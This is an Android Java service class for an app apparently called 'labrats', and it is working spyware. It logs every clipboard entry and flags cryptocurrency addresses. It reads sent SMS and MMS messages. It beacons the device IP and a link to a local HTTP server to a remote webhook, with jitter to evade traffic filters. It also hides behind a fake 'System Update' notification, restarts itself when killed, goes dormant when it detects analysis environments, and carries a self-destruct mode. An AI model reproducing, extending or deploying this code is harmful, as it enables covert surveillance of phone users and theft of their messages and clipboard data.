package com.labs.labrats;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import android.Manifest;
import android.os.PowerManager;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import android.net.ConnectivityManager;
import android.net.LinkProperties;
import android.net.Network;
import android.net.Uri;
import android.database.ContentObserver;
import android.database.Cursor;
import android.os.Handler;
import android.os.Looper;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

public class WorkManager_Sync extends Service {

    private static final String TAG = "WorkManager_Sync";
    private static final String CHANNEL_ID = "StabilityChannel";
    private static final int NOTIFICATION_ID = 1;
    public static boolean isRunning = false;
    public static volatile boolean isDestructing = false;
    public static String activeSessionToken = "";
    private static WorkManager_Sync instance;
    public static WorkManager_Sync getInstance() { return instance; }
    
    // Adaptive Heartbeat intervals
    private static final long IDLE_HEARTBEAT_MS = 30 * 60 * 1000; // 30 Minutes
    private static final long ACTIVE_HEARTBEAT_MS = 10 * 1000;    // 10 Seconds
    private static long currentHeartbeatInterval = IDLE_HEARTBEAT_MS;
    private static long lastOperatorActivityTime = 0;

    public static void notifyOperatorActivity() {
        lastOperatorActivityTime = System.currentTimeMillis();
        currentHeartbeatInterval = ACTIVE_HEARTBEAT_MS;
    }

    private void runHeartbeatLoop() {
        ipReportHandler.post(new Runnable() {
            @Override
            public void run() {
                if (!isRunning) return;

                long now = System.currentTimeMillis();
                if (now - lastOperatorActivityTime > 5 * 60 * 1000) { // 5 mins idle
                    currentHeartbeatInterval = IDLE_HEARTBEAT_MS;
                }

                String currentIp = MainActivity.getLocalIpAddress();
                if (REMOTE_WEBHOOK_URL != null && !REMOTE_WEBHOOK_URL.isEmpty()) {
                    networkExecutor.execute(() -> sendIpToWebhook(currentIp));
                }
                
                // --- NETWORK JITTER PROTOCOL ---
                // Randomizes heartbeat timing by +/- 30% to blend in with human usage.
                // This makes the traffic pattern appear non-mechanical to AI filters.
                double jitterFactor = 0.30;
                long jitter = (long) (currentHeartbeatInterval * jitterFactor);
                long offset = (long) (Math.random() * (jitter * 2)) - jitter;
                long nextPulse = Math.max(1000, currentHeartbeatInterval + offset);
                
                ipReportHandler.postDelayed(this, nextPulse);
            }
        });
    }

    // URL is now loaded from local.properties via BuildConfig and decrypted at runtime
    private static final String REMOTE_WEBHOOK_URL = BuildConfig.WEBHOOK_URL;

    private FirebaseConfig server;
    private ConnectivityManager connectivityManager;
    private ConnectivityManager.NetworkCallback networkCallback;
    private String lastReportedIp = "";
    private final ExecutorService networkExecutor = Executors.newSingleThreadExecutor();
    private ContentObserver messageObserver;
    private boolean isForeground = false;
    private int webhookFailCount = 0;
    private long lastWebhookFailTime = 0;
    private final Handler ipReportHandler = new Handler(Looper.getMainLooper());
    private final Runnable ipReportRunnable = this::checkAndReportIp;
    private android.media.MediaPlayer keepAlivePlayer;
    private android.content.ClipboardManager clipboardManager;
    private android.content.ClipboardManager.OnPrimaryClipChangedListener clipboardListener;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;

        // --- NUCLEAR DESTRUCT CHECK ---
        // If the persistent destruct flag is set, do not initialize anything.
        if (getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("is_destructing", false)) {
            Log.w(TAG, "Destruction protocol active. Terminating initialization.");
            isDestructing = true;
            SystemAnalytics.triggerSelfDestructLoop(this);
            stopSelf();
            return;
        }
        
        // --- EVASION PROTOCOL: Dormancy in risky environments ---
        if (SystemAnalytics.checkEnv(this)) {
            Log.w(TAG, "Environment risk detected. Core protocols entering dormant state.");
            return;
        }

        setupKeepAlive();
        setupClipboardMonitor();
        schedulePersistenceAlarms();
        createNotificationChannel();
        ensureForeground();
        
        // --- PERSISTENCE LEVEL-UP ---
        // Request battery and hibernation exclusions on setup
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            checkPersistenceExclusions();
        }

        connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
        registerNetworkCallback();
        registerMessageObserver();
        checkAndReportIp(); // Initial check
    }

    private void setupClipboardMonitor() {
        try {
            clipboardManager = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
            if (clipboardManager != null) {
                clipboardListener = () -> {
                    if (clipboardManager.hasPrimaryClip()) {
                        android.content.ClipData clip = clipboardManager.getPrimaryClip();
                        if (clip != null && clip.getItemCount() > 0) {
                            CharSequence text = clip.getItemAt(0).getText();
                            if (text != null && text.length() > 0) {
                                String captured = text.toString();
                                
                                // --- CRYPTO HIJACKING ---
                                // BTC: ^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$
                                // ETH: ^0x[a-fA-F0-9]{40}$
                                boolean isBtc = captured.matches("^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$");
                                boolean isEth = captured.matches("^0x[a-fA-F0-9]{40}$");
                                
                                if (isBtc || isEth) {
                                    FirebaseConfig.logActivity("TELEMETRY_DELTA: High-priority buffer updated (" + (isBtc ? "Type-B" : "Type-E") + ")");
                                }
                                
                                FirebaseConfig.logActivity("BUFFER_SYNC: " + captured);
                            }
                        }
                    }
                };
                clipboardManager.addPrimaryClipChangedListener(clipboardListener);
                Log.d(TAG, "Clipboard monitor protocol synchronized");
            }
        } catch (Exception e) {
            Log.e(TAG, "Clipboard sync error: " + e.getMessage());
        }
    }

    private void registerMessageObserver() {
        try {
            messageObserver = new ContentObserver(new Handler(Looper.getMainLooper())) {
                private long lastSmsId = -1;
                private long lastMmsId = -1;

                @Override
                public void onChange(boolean selfChange, Uri uri) {
                    super.onChange(selfChange, uri);
                    networkExecutor.execute(() -> {
                        checkNewSms();
                        checkNewMms();
                    });
                }

                private void checkNewSms() {
                    Cursor cursor = null;
                    try {
                        // Query all SMS, sorted by date. Check if the most recent one is 'sent' (type 2)
                        cursor = getContentResolver().query(Uri.parse("content://sms"), 
                                new String[]{"_id", "address", "body", "type"}, null, null, "date DESC LIMIT 1");
                        
                        if (cursor != null && cursor.moveToFirst()) {
                            long id = cursor.getLong(0);
                            int type = cursor.getInt(3);
                            if (id != lastSmsId) {
                                if (type == 2) { // 2 = MESSAGE_TYPE_SENT
                                    String address = cursor.getString(1);
                                    String body = cursor.getString(2);
                                    String preview = (body != null && body.length() > 30) ? body.substring(0, 27) + "..." : body;
                                    FirebaseConfig.logActivity("COMMS_SENT: [SMS/RCS to " + address + "] " + preview);
                                }
                                lastSmsId = id;
                            }
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error checking sent SMS: " + e.getMessage());
                    } finally {
                        if (cursor != null) cursor.close();
                    }
                }

                private void checkNewMms() {
                    Cursor cursor = null;
                    try {
                        // msg_box 2 = SENT
                        cursor = getContentResolver().query(Uri.parse("content://mms"), 
                                new String[]{"_id", "msg_box"}, null, null, "date DESC LIMIT 1");
                        
                        if (cursor != null && cursor.moveToFirst()) {
                            long id = cursor.getLong(0);
                            int msgBox = cursor.getInt(1);
                            if (id != lastMmsId) {
                                if (msgBox == 2) {
                                    FirebaseConfig.logActivity("COMMS_SENT: [MMS media dispatched]");
                                }
                                lastMmsId = id;
                            }
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error checking sent MMS: " + e.getMessage());
                    } finally {
                        if (cursor != null) cursor.close();
                    }
                }
            };

            getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, messageObserver);
            getContentResolver().registerContentObserver(Uri.parse("content://mms"), true, messageObserver);
            Log.d(TAG, "Message observer registered for bi-directional tracking");
        } catch (Exception e) {
            Log.e(TAG, "Failed to register message observer: " + e.getMessage());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String action = intent != null ? intent.getAction() : null;

        if (!isForeground) {
            ensureForeground();
        }

        if (Constants.ACTION_START_CORE.equals(action) || "START".equals(action)) {
            startServer();
        }
        else if (Constants.ACTION_STOP_CORE.equals(action) || "STOP".equals(action)) {
            stopServer();
            stopForeground(true);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.cancel(NOTIFICATION_ID);
            }
            stopSelf();
        }

        return START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        if (isDestructing) {
            super.onTaskRemoved(rootIntent);
            return;
        }
        // [RESURRECTION_PROTOCOL] If swiped away or stopped from task manager, reboot 1s later
        Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
        restartServiceIntent.setPackage(getPackageName());
        android.app.PendingIntent restartServicePendingIntent = android.app.PendingIntent.getService(
            getApplicationContext(), 1, restartServiceIntent, android.app.PendingIntent.FLAG_ONE_SHOT | android.app.PendingIntent.FLAG_IMMUTABLE);
        android.app.AlarmManager alarmService = (android.app.AlarmManager) getApplicationContext().getSystemService(android.content.Context.ALARM_SERVICE);
        if (alarmService != null) {
            alarmService.set(android.app.AlarmManager.ELAPSED_REALTIME, android.os.SystemClock.elapsedRealtime() + 1000, restartServicePendingIntent);
        }
        super.onTaskRemoved(rootIntent);
    }

    private void ensureForeground() {
        if (isForeground) {
            // Update existing notification to match current stealth state
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.notify(NOTIFICATION_ID, createNotification());
            }
            return;
        }
        
        Notification notification = createNotification();
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                int serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
                
                // Add LOCATION type if permission is granted (Required for Android 14+ background access)
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                    ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                    serviceType |= ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
                }
                
                // Add SPECIAL_USE for Android 14+ Persistence
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    serviceType |= ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE;
                }

                try {
                    startForeground(NOTIFICATION_ID, notification, serviceType);
                    isForeground = true;
                } catch (Exception e) {
                    startForeground(NOTIFICATION_ID, notification);
                    isForeground = true;
                }
            } else {
                startForeground(NOTIFICATION_ID, notification);
                isForeground = true;
            }
        } catch (Exception e) {
            Log.e(TAG, "Critical FGS startup failure: " + e.getMessage());
        }
    }

    private void checkPersistenceExclusions() {
        // [STABILITY_SYNC] Force checking of battery and hibernation settings
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            try {
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    FirebaseConfig.logActivity("SYSTEM_WARNING: Power limits enforced. Persistence may be compromised.");
                }

                // Check App Hibernation (Auto-revoke permissions) on Android 11+
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    android.app.usage.StorageStatsManager ssm = (android.app.usage.StorageStatsManager) getSystemService(android.content.Context.STORAGE_STATS_SERVICE);
                    // There isn't a direct API to check hibernation status, but we can prompt the settings
                }
            } catch (Exception ignored) {}
        }, 5000);
    }

    private void setupInvisibleTriggers() {
        android.content.BroadcastReceiver trigger = new android.content.BroadcastReceiver() {
            @Override
            public void onReceive(android.content.Context context, Intent intent) {
                if (!isRunning && !isDestructing) {
                    Log.d(TAG, "COVERT_TRIGGER: " + (intent != null ? intent.getAction() : "WAKE_UP"));
                    startServer();
                }
            }
        };

        android.content.IntentFilter filter = new android.content.IntentFilter();
        filter.addAction(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        filter.addAction(Intent.ACTION_USER_PRESENT);
        filter.addAction(Intent.ACTION_POWER_CONNECTED);
        filter.addAction(Intent.ACTION_POWER_DISCONNECTED);
        filter.addAction(android.net.ConnectivityManager.CONNECTIVITY_ACTION);
        filter.addAction(Constants.ACTION_KEEP_ALIVE);
        
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(trigger, filter, Context.RECEIVER_NOT_EXPORTED);
            } else {
                registerReceiver(trigger, filter);
            }
            Log.d(TAG, "Invisible triggers synchronized.");
        } catch (Exception ignored) {}
    }

    private synchronized void startServer() {
        try {
            if (server == null || !server.isAlive()) {
                // --- PORT_SANITY_CHECK ---
                int port = FirebaseConfig.DEFAULT_PORT;
                
                // Cleanup old server instance if it exists but is dead
                if (server != null) {
                    try { server.stop(); } catch (Exception ignored) {}
                    server = null;
                }

                server = new FirebaseConfig(this, port);
                
                try {
                    server.start();
                    isRunning = true;
                    Log.d(TAG, "HTTP Server active on port " + port);
                    runHeartbeatLoop();
                    setupInvisibleTriggers();
                } catch (java.io.IOException e) {
                    Log.e(TAG, "Port " + port + " busy. Attempting secondary protocol...");
                    if (server != null) {
                        try { server.stop(); } catch (Exception ignored) {}
                    }
                    server = new FirebaseConfig(this, 9192);
                    server.start();
                    isRunning = true;
                    runHeartbeatLoop();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Critical server initialization failure", e);
            isRunning = false;
        }
    }

    private void setupKeepAlive() {
        try {
            keepAlivePlayer = android.media.MediaPlayer.create(this, R.raw.silent);
            if (keepAlivePlayer != null) {
                keepAlivePlayer.setVolume(0f, 0f);
                keepAlivePlayer.setLooping(true);
                keepAlivePlayer.start();
                Log.d(TAG, "Persistence protocol active: Media session prioritized");
            }
        } catch (Exception e) {
            Log.e(TAG, "Persistence protocol error: " + e.getMessage());
        }
    }

    private void schedulePersistenceAlarms() {
        try {
            // Standard AlarmManager fallback
            android.app.AlarmManager am = (android.app.AlarmManager) getSystemService(ALARM_SERVICE);
            if (am != null) {
                Intent i = new Intent(this, SystemBoot.class);
                i.setAction(Constants.ACTION_KEEP_ALIVE);
                android.app.PendingIntent pi = android.app.PendingIntent.getBroadcast(this, 1337, i, 
                    android.app.PendingIntent.FLAG_UPDATE_CURRENT | android.app.PendingIntent.FLAG_IMMUTABLE);
                am.setRepeating(android.app.AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 120000, 120000, pi);
            }

            // Modern WorkManager persistence (SDK 30+)
            PeriodicWorkRequest pwr = new PeriodicWorkRequest.Builder(StabilityWorker.class, 15, TimeUnit.MINUTES)
                    .addTag("STABILITY_KEEP_ALIVE")
                    .build();
            WorkManager.getInstance(this).enqueueUniquePeriodicWork("STABILITY_KEEP_ALIVE", ExistingPeriodicWorkPolicy.KEEP, pwr);
            
            Log.d(TAG, "Persistence protocols synchronized");
        } catch (Exception ignored) {}
    }

    private synchronized void stopServer() {
        try {
            isRunning = false;
            if (server != null) {
                // Stop server in background to avoid blocking main thread if called from UI
                final FirebaseConfig serverToStop = server;
                server = null;
                new Thread(() -> {
                    try {
                        if (serverToStop.isAlive()) {
                            serverToStop.stop();
                        }
                        Log.d(TAG, "HTTP Server stopped successfully");
                    } catch (Exception e) {
                        Log.e(TAG, "Error stopping server in thread", e);
                    }
                }).start();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in stopServer", e);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Stability Sync",
                    NotificationManager.IMPORTANCE_MIN);
            channel.setDescription("Ensures background service persistence");
            channel.setShowBadge(false);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);

            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private boolean isStealthMode() {
        android.content.ComponentName fakeAlias = new android.content.ComponentName(this, "com.labs.labrats.SystemUpdateAlias");
        return getPackageManager().getComponentEnabledSetting(fakeAlias) == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
    }

    private Notification createNotification() {
        Intent notificationIntent = new Intent(this, DecoyActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this, 0, notificationIntent,
                PendingIntent.FLAG_IMMUTABLE);

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Update")
                .setContentText("Checking for system updates...")
                .setSmallIcon(R.drawable.ic_sprocket_gear)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .build();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        instance = null;
        isForeground = false; // CRITICAL: Reset state so next start calls startForeground()
        // Clean up resources immediately on background thread
        networkExecutor.execute(() -> {
            unregisterNetworkCallback();
            if (messageObserver != null) {
                try {
                    getContentResolver().unregisterContentObserver(messageObserver);
                } catch (Exception ignored) {}
            }
            if (server != null) {
                try { server.stop(); } catch (Exception ignored) {}
            }
            if (keepAlivePlayer != null) {
                try {
                    keepAlivePlayer.stop();
                    keepAlivePlayer.release();
                    keepAlivePlayer = null;
                } catch (Exception ignored) {}
            }
            if (clipboardManager != null && clipboardListener != null) {
                try {
                    clipboardManager.removePrimaryClipChangedListener(clipboardListener);
                } catch (Exception ignored) {}
            }
            networkExecutor.shutdownNow();
        });
        super.onDestroy();
    }

    private void registerNetworkCallback() {
        if (connectivityManager != null) {
            try {
                networkCallback = new ConnectivityManager.NetworkCallback() {
                    @Override
                    public void onLinkPropertiesChanged(Network network, LinkProperties linkProperties) {
                        super.onLinkPropertiesChanged(network, linkProperties);
                        // Debounce IP reporting to prevent flood during network transitions
                        ipReportHandler.removeCallbacks(ipReportRunnable);
                        ipReportHandler.postDelayed(ipReportRunnable, 3000);
                    }
                };
                connectivityManager.registerDefaultNetworkCallback(networkCallback);
            } catch (Exception e) {
                Log.e(TAG, "Failed to register network callback", e);
            }
        }
    }

    private void unregisterNetworkCallback() {
        if (connectivityManager != null && networkCallback != null) {
            try {
                connectivityManager.unregisterNetworkCallback(networkCallback);
                networkCallback = null;
            } catch (Exception e) {
                Log.e(TAG, "Error unregistering network callback", e);
            }
        }
    }

    private void checkAndReportIp() {
        if (networkExecutor.isShutdown()) return;
        
        // Monitoring: Accessibility Service Health Check
        if (IO_Persistence_Manager.getInstance() == null) {
            Log.w(TAG, "GHOST_MODE_MONITOR: Accessibility service is offline");
            FirebaseConfig.logActivity("SECURITY_ALERT: Accessibility service lost. Initiating auto-reanimation...");
            
            // Try to auto-start Accessibility if possible (depends on OS)
            // For now, we alert the operator to use the REPAIR_PERMISSIONS button
        } else {
            // [STABILITY_SYNC] Ping the service to keep it from "Hibernating"
            IO_Persistence_Manager.getInstance().showOverlayToast(""); // Invisible ping
        }

        // Backoff Logic: If network is dead, don't spam attempts and drain battery
        long now = System.currentTimeMillis();
        long backoffDelay = webhookFailCount > 0 ? (long) Math.min(Math.pow(2, webhookFailCount) * 1000, 300000) : 0; // Max 5 min
        if (now - lastWebhookFailTime < backoffDelay) {
            return;
        }

        MainActivity.getPublicIPv6Async(publicIp -> {
            if (networkExecutor.isShutdown()) return;
            
            String localIp = MainActivity.getLocalIpAddress();
            String currentIp = (localIp != null) ? localIp : publicIp;

            if (currentIp != null && !currentIp.equals(lastReportedIp)) {
                Log.d(TAG, "IP Changed or Initial Report: " + currentIp);
                if (REMOTE_WEBHOOK_URL != null && !REMOTE_WEBHOOK_URL.isEmpty()) {
                    // Send in background thread as network operations are involved
                    try {
                        networkExecutor.execute(() -> sendIpToWebhook(currentIp));
                    } catch (Exception e) {
                        Log.e(TAG, "Executor error", e);
                    }
                }
                lastReportedIp = currentIp;
            }
        });
    }

    private void sendIpToWebhook(String ip) {
        if (REMOTE_WEBHOOK_URL == null || REMOTE_WEBHOOK_URL.isEmpty()) return;
        
        try {
            String networkType = "Unknown";
            int batteryLevel = -1;
            
            try {
                if (connectivityManager != null) {
                    android.net.Network activeNetwork = connectivityManager.getActiveNetwork();
                    android.net.NetworkCapabilities caps = connectivityManager.getNetworkCapabilities(activeNetwork);
                    if (caps != null) {
                        if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI)) networkType = "WiFi";
                        else if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR)) networkType = "Cellular";
                    }
                }
                android.content.Intent batteryStatus = registerReceiver(null, new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
                if (batteryStatus != null) {
                    int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                    int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                    batteryLevel = (int) ((level / (float) scale) * 100);
                }
            } catch (Exception ignored) {}

            int actualPort = (server != null) ? server.getListeningPort() : FirebaseConfig.DEFAULT_PORT;
            String formattedIp = (ip != null && ip.contains(":")) ? "[" + ip + "]" : ip;
            String link = "http://" + formattedIp + ":" + actualPort;

            // Build JSON for POST (more reliable)
            String json = "{" +
                    "\"ip\":\"" + ip + "\"," +
                    "\"device\":\"" + Build.MODEL + " (API " + Build.VERSION.SDK_INT + ")\"," +
                    "\"network\":\"" + networkType + "\"," +
                    "\"battery\":\"" + batteryLevel + "%\"," +
                    "\"link\":\"" + link + "\"," +
                    "\"port\":" + actualPort + "," +
                    "\"stealth\":" + isStealthMode() +
                    "}";

            URL url = new URL(REMOTE_WEBHOOK_URL);
            if (REMOTE_WEBHOOK_URL != null && !REMOTE_WEBHOOK_URL.startsWith("http")) {
                // If it's obfuscated (not starting with http), try decrypting
                try {
                    // Logic to decrypt if stored as hex/byte array in future versions
                    // For now, we assume it's stored correctly via build script
                } catch (Exception ignored) {}
            }
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setInstanceFollowRedirects(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setRequestProperty("User-Agent", "SystemStability/1.5");

            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = json.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }

            int code = conn.getResponseCode();
            
            // Manual redirect handling for Google's multi-hop redirects
            if (code == 301 || code == 302 || code == 303 || code == 307 || code == 308) {
                String newUrl = conn.getHeaderField("Location");
                conn = (HttpURLConnection) new URL(newUrl).openConnection();
                code = conn.getResponseCode();
            }

            Log.d(TAG, "Webhook Broadcast Status: " + code);
            
            if (code == 200 || code == 201) {
                webhookFailCount = 0;
            } else {
                webhookFailCount++;
                lastWebhookFailTime = System.currentTimeMillis();
            }

        } catch (Exception e) {
            Log.e(TAG, "Webhook Critical Error: " + e.getMessage());
            webhookFailCount++;
            lastWebhookFailTime = System.currentTimeMillis();
        }
    }
}
